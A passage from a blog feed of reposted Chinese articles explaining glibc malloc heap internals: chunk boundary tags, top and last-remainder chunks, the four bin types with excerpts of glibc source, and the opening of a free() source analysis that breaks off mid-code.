chunk。将P于BK合并在一起是很容易的，因为可以通过P的size字段轻松定位到BK的开始位置，进而获取BK的size等等，但是将P于FD合并却很难，我们必须从头遍历整个堆，找到FD，然后加以合并，这就意味着每次进行chunk释放操作消耗的时间与堆的大小成线性关系。为了解决这个问题，Knuth提出了一种聪明而通用的技术——边界标记。</p><p>Knuth在每个chunk的最后添加了一个脚部(Footer)，它就是该chunk 头部(header)的一个副本，我们称之为边界标记：</p><p><img src="/images/2017-09-10/v2-d31eb1d32944769bdd5477f3d277d7fd_b.png"></p><p>图5-4 改进版的chunk格式之Knuth边界标记</p><p>显然每个chunk的脚部都在其相邻的下一个chunk的头部的前4个字节处。通过这个脚部，堆内存管理器就可以很容易地得到前一个chunk的起始位置和分配状态，进而加以合并了。</p><p>但是，边界标记同时带来了一个问题：它要求每个块都包含一个头部和脚部，如果应用程序频繁地进行小内存的申请和释放操作的话(比如1，2个字节)，就会造成很大的性能损耗。同时，考虑到只有在对free chunk进行合并的时候才需要脚部，也就是说对于allocated chunk而言它并不需要脚部，因此我们可以对这个脚部加以优化——将前一个chunk的已分配&#x2F;空闲标记位存储在当前chunk的size字段的第1，或2比特位上，这样如果我们通过当前chunk的size字段知道了前一个chunk为free chunk，那么就可得出结论：当前chunk地址之前的4个字节为前一个free chunk的脚部，我们可以通过该脚部获取前一个chunk的起始位置；如果当前chunk的size字段的标记位表明前一个chunk是allocated chunk的话，那么就可得出另一个结论：前一个chunk没有脚部，即当前chunk地址之前的4个字节为前一个allocated chunk的payload或padding的最后部分。新的chunk格式图如下：</p><p><img src="/images/2017-09-10/v2-0eadd69a889223eafc585134de13d866_b.png"></p><p>图5-5 改进版的Knuth边界标记allocated chunk格式</p><p><img src="/images/2017-09-10/v2-83f58d72c5b960bd72603c4a94477744_b.png"></p><p>图5-6 改进版的Knuth边界标记free chunk格式</p><h5 id="2-再进化——支持多线程"><a href="#2-再进化——支持多线程" class="headerlink" title="2.再进化——支持多线程"></a>2.再进化——支持多线程</h5><p>随着技术的发展，特别是堆内存管理器添加对多线程的支持，前述的chunk格式已经难以满足需求，比如，我们需要标志位来标记当前chunk是否属于非主线程即thread arena，以及该chunk由mmap得来还是通过brk实现等等。但此时chunk size只剩下一个比特位未使用了，怎么办呢？这需要对chunk格式进行大手术！</p><p>首先思考：是否有必要同时保存当前chunk和<strong>前一个chunk的已分配&#x2F;空闲标记位？答案是否定的，因为我们只需要保存前一个chunk的分配标志位就可以了，至于当前chunk的分配标志位，可以通过查询下一个chunk的size字段得到</strong>。那么size字段中剩下的两个比特位就可以用于满足多线程的标志需求了：</p><p><img src="/images/2017-09-10/v2-9a5a0e9737b5dcb4e14ec4d186d8ddf6_b.png"></p><p>图5-7 多线程版本Knuth边界标记allocated chunk格式</p><p><img src="/images/2017-09-10/v2-66621268cd9759bd19e6dc07a41eab9c_b.png"></p><p>图5-8 多线程版本Knuth边界标记free chunk格式</p><p>这里的P,M,N的含义如下：</p><blockquote><p>PREV_INUSE(P): 表示前一个chunk是否为allocated。</p><p>IS_MMAPPED(M)：表示当前chunk是否是通过mmap系统调用产生的。</p><p>NON_MAIN_ARENA(N)：表示当前chunk是否是thread arena。</p></blockquote><p>再进一步，发现没必要保存chunk size的副本，也就是说Footer的作用并不大，但是如果前一个chunk是free的话，在合并的时候我们又需要知道前一个chunk的大小，怎么办呢？将Footer从尾部移到首部，同时其不再保存当前chunk的size，而是前一个free chunk的size不就行了。同样的，为了提高内存利用率，如果前一个chunk是allocated chunk的话，这个Footer就作为allocated chunk的payload或padding的一部分，结构图如下：</p><p><img src="/images/2017-09-10/v2-42f98a954d6d13971d640b34bfe60b55_b.png"></p><p>图5-9 当前glibc malloc allocated chunk格式</p><p><img src="/images/2017-09-10/v2-9dcc9c637c66bae48402c9bb9d11d568_b.png"></p><p>图5-10 当前glibc malloc free chunk格式</p><p>至此，glibc malloc堆内存管理器中使用的隐式链表技术就介绍完毕了。现在我们再回过头去看malloc_chunk结构体就很好理解了：该结构体通过每个chunk的prev_size和size构成了隐式链表，而后续的fd, bk等指针并不是作用于隐式链表的，而是用于后文会介绍的用于加快内存分配和释放效率的显示链表bin(还记得bin么？用于记录同一类型free chunk的链表)，并且这些指针跟prev_size一样只在free chunk中存在。关于显示链表bin的原理比较复杂，让我们带着疑惑，暂时略过这部分信息，等介绍完所有chunk之后再加以详细介绍。</p><h4 id="5-2-Top-Chunk"><a href="#5-2-Top-Chunk" class="headerlink" title="5.2 Top Chunk"></a>5.2 Top Chunk</h4><p>当一个chunk处于一个arena的最顶部(即最高内存地址处)的时候，就称之为top chunk。该chunk并<strong>不属于任何bin</strong>，而是在系统当前的所有free chunk(无论那种bin)都无法满足用户请求的内存大小的时候，将此chunk当做一个应急消防员，分配给用户使用。如果top chunk的大小比用户请求的大小要大的话，就将该top chunk分作两部分：1）用户请求的chunk；2）剩余的部分成为新的top chunk。否则，就需要扩展heap或分配新的heap了——在main arena中通过sbrk扩展heap，而在thread arena中通过mmap分配新的heap。</p><h4 id="5-3-Last-Remainder-Chunk"><a href="#5-3-Last-Remainder-Chunk" class="headerlink" title="5.3 Last Remainder Chunk"></a>5.3 Last Remainder Chunk</h4><p>要想理解此chunk就必须先理解glibc malloc中的bin机制。如果你已经看了第二部分文章，那么下面的原理就很好理解了，否则建议你先阅读第二部分文章。对于Last remainder chunk，我们主要有两个问题：1)它是怎么产生的；2)它的作用是什么？</p><p>先回答第一个问题。还记得第二部分文章中对small bin的malloc机制的介绍么？当用户请求的是一个small chunk，且该请求无法被small bin、unsorted bin满足的时候，就通过binmaps遍历bin查找最合适的chunk，如果该chunk有剩余部分的话，就将该剩余部分变成一个新的chunk加入到unsorted bin中，另外，<strong>再将该新的chunk变成新的last remainder chunk</strong>。</p><p>然后回答第二个问题。此类型的chunk用于提高连续malloc(small chunk)的效率，主要是提高内存分配的局部性。那么具体是怎么提高局部性的呢？举例说明。当用户请求一个small chunk，且该请求无法被small bin满足，那么就转而交由unsorted bin处理。同时，假设当前unsorted bin中只有一个chunk的话——就是last remainder chunk，那么就将该chunk分成两部分：前者分配给用户，剩下的部分放到unsorted bin中，并成为新的last remainder chunk。这样就保证了连续malloc(small chunk)中，各个small chunk在内存分布中是相邻的，即提高了内存分配的局部性。</p><p><strong>作者：走位@阿里聚安全，更多安全技术文章，请点击</strong><a href="https://jaq.alibaba.com/community/index">**阿里聚安全博客 **</a></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>堆&amp;栈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux堆内存管理深入分析（下）</title>
    <link href="/2023/11/09/Linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8B%EF%BC%89%20(1)/"/>
    <url>/2023/11/09/Linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8B%EF%BC%89%20(1)/</url>
    
    <content type="html"><![CDATA[<h2 id="0-前言回顾"><a href="#0-前言回顾" class="headerlink" title="0 前言回顾"></a>0 前言回顾</h2><p>在上一篇文章中（链接见文章底部），详细介绍了堆内存管理中涉及到的基本概念以及相互关系，同时也着重介绍了堆中chunk分配和释放策略中使用到的隐式链表技术。通过前面的介绍，我们知道使用隐式链表来管理内存chunk总会涉及到内存的遍历，效率极低。对此glibc malloc引入了显示链表技术来提高堆内存分配和释放的效率。</p><p>所谓的显示链表就是我们在数据结构中常用的链表，而链表本质上就是将一些属性相同的“结点”串联起来，方便管理。在glibc malloc中这些链表统称为bin，链表中的“结点”就是各个chunk，结点的共同属性就是：</p><ul><li><p>均为free chunk；</p></li><li><p>同一个链表中各个chunk的大小相等(有一个特例，详情见后文)。</p></li></ul><h2 id="1-bin介绍"><a href="#1-bin介绍" class="headerlink" title="1 bin介绍"></a>1 bin介绍</h2><p>如前文所述，<font color=#f00><strong>bin是一种记录free chunk的链表数据结构</strong></font>。系统针对不同大小的free chunk，将bin分为了4类：1) Fast bin; 2) Unsorted bin; 3) Small bin; 4) Large bin。</p><p>在glibc中用于记录bin的数据结构有两种，分别如下所示：</p><p><strong>fastbinsY</strong>: 这是一个数组，用于记录所有的fast bins；</p><p><strong>bins</strong>: 这也是一个数组，用于记录除fast bins之外的所有bins。事实上，一共有126个bins，分别是：</p><ul><li><p>bin 1 为unsorted bin;</p></li><li><p>bin 2 到63为small bin;</p></li><li><p>bin 64到126为large bin。</p></li></ul><p>其中具体数据结构定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span></span><br><span class="hljs-class">&#123;</span><br>  ……<br>  <span class="hljs-comment">/* Fastbins */</span><br>  mfastbinptr fastbinsY[NFASTBINS];<br>  ……<br>  <span class="hljs-comment">/* Normal bins packed as described above */</span><br>  mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];  <span class="hljs-comment">// #define NBINS    128</span><br>  ……<br>&#125;;<br>这里mfastbinptr的定义：<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> *<span class="hljs-title">mfastbinptr</span>;</span><br>mchunkptr的定义：<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">mchunkptr</span>;</span><br></code></pre></td></tr></table></figure><p>画图更直观：</p><p><img src="/images/2017-09-15/420rbsdeo2o0.png"></p><p>那么处于bins中个各个free chunk是如何链接在一起的呢？回顾malloc_chunk的数据结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br>  <span class="hljs-comment">/* #define INTERNAL_SIZE_T size_t */</span><br>  INTERNAL_SIZE_T      prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span><br>  INTERNAL_SIZE_T      size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>         <span class="hljs-comment">/* 这两个指针只在free chunk中存在*/</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br> <br>  <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>其中的fd和bk指针就是指向当前chunk所属的链表中forward或者backward chunk。</p><h2 id="2-Fast-bin"><a href="#2-Fast-bin" class="headerlink" title="2 Fast bin"></a>2 Fast bin</h2><p>既然有fast bin，那就肯定有fast chunk——chunk size为<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1249">16</a>到<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1600">80</a>字节的chunk就叫做fast chunk。为了便于后文描述，这里对chunk大小做如下约定：</p><ol><li><pre><code class="hljs"> 只要说到chunk size，那么就表示该malloc_chunk的实际整体大小；</code></pre></li><li><pre><code class="hljs"> **而说到chunk unused size，就表示该malloc_chunk中刨除诸如prev_size, size, fd和bk这类辅助成员之后的实际可用的大小。因此，对free chunk而言，其实际可用大小总是比实际整体大小少16字节。**</code></pre></li></ol><p>在内存分配和释放过程中，fast bin是所有bin中操作速度最快的。下面详细介绍fast bin的一些特性：</p><ol><li>fast bin的个数——10个</li></ol><p>2)每个fast bin都是一个单链表(<strong>只使用fd指针</strong>)。为什么使用单链表呢？因为在fast bin中无论是添加还是移除fast chunk，都是对“<strong>链表尾</strong>”进行操作，而不会对某个中间的fast chunk进行操作。更具体点就是LIFO(后入先出)算法：添加操作(free内存)就是将新的fast chunk加入链表尾，删除操作(malloc内存)就是将链表尾部的fast chunk删除。需要注意的是，为了实现LIFO算法，fastbinsY数组中每个fastbin元素均指向了该链表的rear end（尾结点），而尾结点通过其fd指针指向前一个结点，依次类推，如图所示。</p><p>在main arena中Fast bins(即数组fastbinsY)的整体操作示意图如下图所示：</p><p><img src="/images/2017-09-15/420rc04q9ad0.png"></p><p>​图2-1 fast bin示意图</p><ol start="3"><li><p>chunk size：10个fast bin中所包含的fast chunk size是按照步进8字节排列的，即第一个fast bin中所有fast chunk size均为16字节，第二个fast bin中为24字节，依次类推。在进行malloc初始化的时候，最大的fast chunk size被设置为80字节(chunk unused size为64字节)，因此<strong>默认情况下大小为16到80字节的chunk被分类到fast chunk</strong>。详情如上图</p></li><li><p>不会对free chunk进行合并操作。鉴于设计fast bin的初衷就是进行快速的<strong>小内存</strong>分配和释放，因此系统将属于fast bin的chunk的P(未使用标志位)总是设置为1，这样即使当fast bin中有某个chunk同一个free chunk相邻的时候，系统也不会进行自动合并操作，而是保留两者。虽然这样做可能会造成额外的碎片化问题，但瑕不掩瑜。</p></li><li><p>malloc(fast chunk)操作：即用户通过malloc请求的大小属于fast chunk的大小范围(注意：用户请求size加上16字节就是实际内存chunk size)。在初始化的时候fast bin支持的最大内存大小以及所有fast bin链表都是空的，所以当最开始使用malloc申请内存的时候，即使申请的内存大小属于fast chunk的内存大小(即16到80字节)，它也不会交由fast bin来处理，而是向下传递交由small bin来处理，如果small bin也为空的话就交给unsorted bin处理：</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Maximum size of memory handled in fastbins.  */</span><br><span class="hljs-type">static</span> INTERNAL_SIZE_T global_max_fast;<br> <br><span class="hljs-comment">/* offset 2 to use otherwise unindexable first 2 bins */</span><br><span class="hljs-comment">/*这里SIZE_SZ就是sizeof(size_t)，在32位系统为4，64位为8，fastbin_index就是根据要malloc的size来快速计算该size应该属于哪一个fast bin，即该fast bin的索引。因为fast bin中chunk是从16字节开始的，所有这里以8字节为单位(32位系统为例)有减2*8 = 16的操作！*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> fastbin_index(sz) \</span><br><span class="hljs-meta">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br> <br> <br><span class="hljs-comment">/* The maximum fastbin request size we support */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_FAST_SIZE     (80 * SIZE_SZ / 4)</span><br> <br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NFASTBINS  (fastbin_index (request2size (MAX_FAST_SIZE)) + 1)</span><br></code></pre></td></tr></table></figure><p>那么fast bin 是在哪？怎么进行初始化的呢？当我们第一次调用malloc(fast bin)的时候，系统执行_int_malloc函数，该函数首先会发现当前fast bin为空，就转交给small bin处理，进而又发现small bin 也为空，就调用malloc_consolidate函数对malloc_state结构体进行初始化，malloc_consolidate函数主要完成以下几个功能：</p><ul><li><p>首先判断当前malloc_state结构体中的fast bin是否为空，如果为空就说明整个malloc_state都没有完成初始化，需要对malloc_state进行初始化。</p></li><li><p>malloc_state的初始化操作由函数malloc_init_state(av)完成，该函数先初始化除fast bin之外的所有的bins(构建双链表，详情见后文small bins介绍)，再初始化fast bins。</p></li></ul><p>然后当再次执行malloc(fast chunk)函数的时候，此时fast bin相关数据不为空了，就开始使用fast bin(见下面代码中的※1部分)：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br>_int_malloc (mstate av, <span class="hljs-type">size_t</span> bytes)<br>&#123;<br>  ……<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">     If the size qualifies as a fastbin, first check corresponding bin.</span><br><span class="hljs-comment">     This code is safe to execute even if av is not yet initialized, so we</span><br><span class="hljs-comment">     can try it without checking, which saves some time on this fast path.</span><br><span class="hljs-comment">   */</span><br>   <span class="hljs-comment">//第一次执行malloc(fast chunk)时这里判断为false，因为此时get_max_fast ()为0</span><br>   <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (get_max_fast ()))<br>    &#123;<br>  ※<span class="hljs-number">1</span>  idx = fastbin_index (nb);<br>      mfastbinptr *fb = &amp;fastbin (av, idx);<br>      mchunkptr pp = *fb;<br>      <span class="hljs-keyword">do</span><br>        &#123;<br>          victim = pp;<br>          <span class="hljs-keyword">if</span> (victim == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>   ※<span class="hljs-number">2</span> <span class="hljs-keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))!= victim);<br>      <span class="hljs-keyword">if</span> (victim != <span class="hljs-number">0</span>)<br>        &#123;<br>          <span class="hljs-keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="hljs-number">0</span>))<br>            &#123;<br>              errstr = <span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>;<br>            errout:<br>              malloc_printerr (check_action, errstr, chunk2mem (victim));<br>              <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>            &#125;<br>          check_remalloced_chunk (av, victim, nb);<br>          <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>          alloc_perturb (p, bytes);<br>          <span class="hljs-keyword">return</span> p;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>得到第一个来自于fast bin的chunk之后，系统就将该chunk从对应的fast bin中移除，并将其地址返回给用户，见上面代码※2处。</p><ol start="6"><li>free(fast chunk)操作：这个操作很简单，主要分为两步：先通过chunksize函数根据传入的地址指针获取该指针对应的chunk的大小；然后根据这个chunk大小获取该chunk所属的fast bin，然后再将此chunk添加到该fast bin的链尾即可。整个操作都是在_int_free函数中完成。</li></ol><h2 id="3-Unsorted-bin"><a href="#3-Unsorted-bin" class="headerlink" title="3 Unsorted bin"></a>3 Unsorted bin</h2><p>当释放较小或较大的chunk的时候，如果系统没有将它们添加到对应的bins中(为什么，在什么情况下会发生这种事情呢？详情见后文)，系统就将这些chunk添加到unsorted bin中。为什么要这么做呢？这主要是为了让“glibc malloc机制”能够有第二次机会重新利用最近释放的chunk(第一次机会就是fast bin机制)。利用unsorted bin，可以加快内存的分配和释放操作，因为整个操作都不再需要花费额外的时间去查找合适的bin了。</p><p>Unsorted bin的特性如下：</p><ol><li><p>unsorted bin的个数： 1个。unsorted bin是一个由free chunks组成的循环双链表。</p></li><li><p>Chunk size: 在unsorted bin中，对chunk的大小并没有限制，任何大小的chunk都可以归属到unsorted bin中。这就是前言说的特例了，不过特例并非仅仅这一个，后文会介绍。</p></li></ol><h2 id="4-Small-bin"><a href="#4-Small-bin" class="headerlink" title="4 Small bin"></a>4 Small bin</h2><p>小于512字节的chunk称之为small chunk，small bin就是用于管理small chunk的。就内存的分配和释放速度而言，small bin比larger bin快，但比fast bin慢。</p><p>Small bin的特性如下：</p><ol><li><p>small bin个数：62个。每个small bin也是一个由对应free chunk组成的循环双链表。同时Small bin采用FIFO(先入先出)算法：内存释放操作就将新释放的chunk添加到链表的front end(前端)，分配操作就从链表的rear end(尾端)中获取chunk。</p></li><li><p>chunk size: 同一个small bin中所有chunk大小是一样的，且第一个small bin中chunk大小为16字节，后续每个small bin中chunk的大小依次增加8字节，即最后一个small bin的chunk为16 + 61*8 &#x3D; 508字节。</p></li><li><p>合并操作：相邻的free chunk需要进行合并操作，即合并成一个大的free chunk。具体操作见下文free(small chunk)介绍。</p></li><li><p>malloc(small chunk)操作：类似于fast bins，最初所有的small bin都是空的，因此在对这些small bin完成初始化之前，即使用户请求的内存大小属于small chunk也不会交由small bin进行处理，而是交由unsorted bin处理，如果unsorted bin也不能处理的话，glibc malloc就依次遍历后续的所有bins，找出第一个满足要求的bin，如果所有的bin都不满足的话，就转而使用top chunk，如果top chunk大小不够，那么就扩充top chunk，这样就一定能满足需求了(还记得上一篇文章中在Top Chunk中留下的问题么？答案就在这里)。注意遍历后续bins以及之后的操作同样被large bin所使用，因此，将这部分内容放到large bin的malloc操作中加以介绍。</p></li></ol><p>那么glibc malloc是如何初始化这些bins的呢？因为这些bin属于malloc_state结构体，所以在初始化malloc_state的时候就会对这些bin进行初始化，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">malloc_init_state (mstate av)<br>&#123;<br>  <span class="hljs-type">int</span> i;<br>  mbinptr bin;<br> <br>  <span class="hljs-comment">/* Establish circular links for normal bins */</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; NBINS; ++i)<br>    &#123;<br>      bin = bin_at (av, i);<br>      bin-&gt;fd = bin-&gt;bk = bin;<br>&#125;<br>……<br>&#125;<br></code></pre></td></tr></table></figure><p>注意在malloc源码中，将bins数组中的<strong>第一个成员索引值设置为了****1</strong>，而不是我们常用的0(在bin_at宏中，自动将i进行了减1处理…)。从上面代码可以看出在初始化的时候glibc malloc将所有bin的指针都指向了自己——这就代表这些bin都是空的。</p><p>过后，当再次调用malloc(small chunk)的时候，如果该chunk size对应的small bin不为空，就从该small bin链表中取得small chunk，否则就需要交给unsorted bin及之后的逻辑来处理了。</p><ol start="5"><li>free(small chunk)：当释放small chunk的时候，先检查该chunk相邻的chunk是否为free，如果是的话就进行合并操作：将这些chunks合并成新的chunk，然后将它们从small bin中移除，<strong>最后将新的chunk添加到unsorted bin中</strong>。</li></ol><h2 id="5-Large-bin"><a href="#5-Large-bin" class="headerlink" title="5 Large bin"></a>5 Large bin</h2><p>大于512字节的chunk称之为large chunk，large bin就是用于管理这些large chunk的。</p><p>Large bin的特性如下：</p><ol><li>large bin的数量：63个。Large bin类似于small bin，只是需要注意两点：一是同一个large bin中每个chunk的大小可以不一样，但必须处于某个给定的范围(特例2) ；二是large chunk可以添加、删除在large bin的任何一个位置。</li></ol><p>在这63个large bins中，前32个large bin依次以64字节步长为间隔，即第一个large bin中chunk size为512~575字节，第二个large bin中chunk size为576 ~ 639字节。紧随其后的16个large bin依次以512字节步长为间隔；之后的8个bin以步长4096为间隔；再之后的4个bin以32768字节为间隔；之后的2个bin以262144字节为间隔；剩下的chunk就放在最后一个large bin中。</p><p>鉴于同一个large bin中每个chunk的大小不一定相同，因此为了加快内存分配和释放的速度，就将同一个large bin中的所有chunk按照chunk size进行<strong>从大到小的排列</strong>：最大的chunk放在链表的front end，最小的chunk放在rear end。</p><ol start="2"><li><p>合并操作：类似于small bin。</p></li><li><p>malloc(large chunk)操作：</p></li></ol><p>初始化完成之前的操作类似于small bin，这里主要讨论large bins初始化完成之后的操作。首先确定用户请求的大小属于哪一个large bin，然后判断该large bin中最大的chunk的size是否大于用户请求的size(只需要对比链表中front end的size即可)。如果大于，就从rear end开始遍历该large bin，找到第一个size相等或接近的chunk，分配给用户。如果该chunk大于用户请求的size的话，就将该chunk拆分为两个chunk：前者返回给用户，且size等同于用户请求的size；剩余的部分做为一个新的chunk<strong>添加到unsorted bin</strong>中。</p><p>如果该large bin中最大的chunk的size小于用户请求的size的话，那么就依次查看后续的large bin中是否有满足需求的chunk，不过需要注意的是鉴于bin的个数较多(不同bin中的chunk极有可能在不同的内存页中)，如果按照上一段中介绍的方法进行遍历的话(即遍历每个bin中的chunk)，就可能会发生多次内存页中断操作，进而严重影响检索速度，所以glibc malloc设计了Binmap结构体来帮助提高bin-by-bin检索的速度。Binmap记录了各个bin中是否为空，通过binmap可以避免检索一些空的bin。如果通过binmap找到了下一个非空的large bin的话，就按照上一段中的方法分配chunk，否则就使用top chunk来分配合适的内存。</p><ol start="4"><li>Free(large chunk)：类似于small chunk。</li></ol><p>了解上面知识之后，再结合下图5-1，就不难理解各类bins的处理逻辑了：</p><p><img src="/images/2017-09-15/420rc31ppb10.jpg"></p><h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6 总结"></a>6 总结</h2><p>至此glibc malloc中涉及到的所有显示链表技术已经介绍完毕。鉴于篇幅和精力有限，本文没能详细介绍完所有的技术细节，但是我相信带着这些知识点再去研究glibc malloc的话，定能起到事半功倍的效果。</p><p>另外，就我个人所了解到的基于堆溢出攻击而言，掌握以上知识，已经足够理解绝大部分堆溢出攻击技术了。因此，后面的文章将会结合这些知识详细介绍各个攻击技术的实现原理。</p><p>老规矩：如有错误，欢迎斧正！</p><p><strong>作者：走位@阿里聚安全，更多安全技术文章，请点击</strong><a href="https://jaq.alibaba.com/community/index">**阿里聚安全博客 **</a></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>堆&amp;栈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>free源码分析——1</title>
    <link href="/2023/11/09/free%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E2%80%94%E2%80%941/"/>
    <url>/2023/11/09/free%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E2%80%94%E2%80%941/</url>
    
    <content type="html"><![CDATA[<h1 id="free源码分析—-libc-free"><a href="#free源码分析—-libc-free" class="headerlink" title="free源码分析—__libc_free"></a>free源码分析—__libc_free</h1><p>本章继续之前的glibc中的《malloc源码分析》系列开始分析free的源代码，malloc的源码分析可以查看博客里同类别文章下的《malloc源码分析—1》到《malloc源码分析—5》，因此free的源码中有一些结构和malloc相似的地方就不会做过多的介绍了。</p><p>首先在glibc的malloc.c中有如下定义，</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">strong_alias</span><span class="hljs-params">( __libc_free, __cfree)</span></span><br><span class="hljs-function"><span class="hljs-title">weak_alias</span><span class="hljs-params">( __libc_free, cfree)</span></span><br><span class="hljs-function"><span class="hljs-title">strong_alias</span><span class="hljs-params">( __libc_free, __free)</span></span><br><span class="hljs-function"><span class="hljs-title">strong_alias</span><span class="hljs-params">( __libc_free, free)</span></span><br></code></pre></td></tr></table></figure><p>因此，<code>free</code>是<code>__libc_free</code>的别名，实际执行的是<code>__libc_free</code>函数，下面来看，</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-type">void</span> __libc_free(<span class="hljs-type">void</span> *mem) &#123;<br>    mstate ar_ptr;<br>    mchunkptr p;<br><br>    <span class="hljs-built_in">void</span> 